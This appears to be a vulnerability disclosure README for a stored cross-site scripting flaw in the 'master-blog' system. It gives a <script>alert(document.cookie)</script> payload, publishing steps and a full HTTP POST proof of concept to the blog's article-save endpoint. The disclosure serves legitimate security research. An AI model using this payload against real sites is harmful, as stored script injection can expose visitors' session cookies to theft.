# master-blog_xss
master-blog_xss  
system url:https://gitee.com/manster1231/master-blog  
A vulnerability was found in master-blog system . The manipulation of the argument description with the input <script>alert(document.cookie)</script> leads to cross site scripting. It is possible to initiate the attack remotely.  
Click the add article button, write a malicious script in the content of the public article, and then click "publish".  
![image](https://github.com/Andriesces/master-blog_xss/assets/139127885/7e0afe42-ecd8-4018-ac03-e97a8634e5ed)  
When other users browse the article, malicious code will be triggered.  
![image](https://github.com/Andriesces/master-blog_xss/assets/139127885/b37d3051-22a7-4ac6-9516-58ee343e7705)  
payload:payload:<script>alert(document.cookie)</script>  
POC:
POST /admin/blogs/save HTTP/1.1  
Host: 127.0.0.1:9777  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 165  
Origin: http://127.0.0.1:9777  
Connection: close  
Referer: http://127.0.0.1:9777/admin/blogs/1/edit  
Cookie: blog_remember_author=11; blog_remember_mail=165482%40qq.com; blog_remember_url=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fqq_40582773%2F65565235; PHPSESSID=gkqpuh043r1fsp7e36sg32j0u6; JSESSIONID=EDFF7326FC80745A65788B966F03675F  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1  

published=true&id=1&flag=&id=&title=11111&content=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&typeId=1&tagIds=&firstPicture=11&description=111&recommend=on  


